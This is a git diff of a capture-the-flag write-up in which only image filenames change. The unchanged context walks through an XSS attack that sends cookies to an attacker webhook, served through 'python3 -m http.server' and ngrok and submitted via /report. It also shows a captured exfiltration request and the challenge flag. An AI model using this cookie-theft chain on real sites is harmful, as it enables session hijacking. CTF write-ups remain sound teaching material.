@@ -93,7 +93,7 @@ Password: password123
 
 When the dashboard renders this username, the browser will execute it as JavaScript and send all cookies to our webhook.
 
-<figure><img src="../../../.gitbook/assets/image (604).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (763).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
@@ -151,7 +151,7 @@ python3 -m http.server 8080
 ngrok http 8080
 ```
 
-<figure><img src="../../../.gitbook/assets/image (605).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (764).png" alt=""><figcaption></figcaption></figure>
 
 #### Step 3: Submit URL to /report
 
@@ -161,7 +161,7 @@ Go to `/report` and submit:
 https://YOUR-NGROK-URL/attack.html
 ```
 
-<figure><img src="../../../.gitbook/assets/image (607).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (766).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
@@ -175,7 +175,7 @@ You will see a request like:
 GET /?c=flag=KSUS{...}; session=...
 ```
 
-<figure><img src="../../../.gitbook/assets/image (606).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (765).png" alt=""><figcaption></figcaption></figure>
 
 ```
 Flag : KSUS{moneyless_iframe_baby}
